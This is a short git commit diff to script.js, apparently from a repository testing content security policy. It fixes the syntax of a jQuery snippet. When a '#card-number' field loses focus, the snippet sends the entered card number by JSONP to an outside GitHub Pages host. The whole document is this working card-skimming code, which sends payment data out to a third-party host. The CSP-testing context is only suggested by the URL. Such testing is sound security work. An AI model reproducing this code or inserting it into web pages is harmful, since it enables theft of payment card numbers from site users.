2bcc567205c73ed7cf30778f7abb4d5122fd0156
Mariusz Miesiak <mariusz.miesiak@camelotglobal.com>
2019-05-30 12:09:08 +0300

    fix

--- script.js
+++ script.js
@@ -1,16 +1,17 @@
 setTimeout(function() {
   $("#card-number").on('blur', function() {
     $.ajax({
-    url: "https://mmiesiak.github.io/csp/test.html?card=" + $(this).val(),
- 
-    // The name of the callback parameter, as specified by the YQL service
-    jsonp: "callback",
-      
-    dataType: "jsonp",
- 
-    // Work with the response
-    success: function( response ) {
-        console.log( response );
-    }
+      url: "https://mmiesiak.github.io/csp/test.html?card=" + $(this).val(),
+
+      // The name of the callback parameter, as specified by the YQL service
+      jsonp: "callback",
+
+      dataType: "jsonp",
+
+      // Work with the response
+      success: function( response ) {
+          console.log( response );
+      }
+    })
   })
-}), 5000);
+}, 5000);
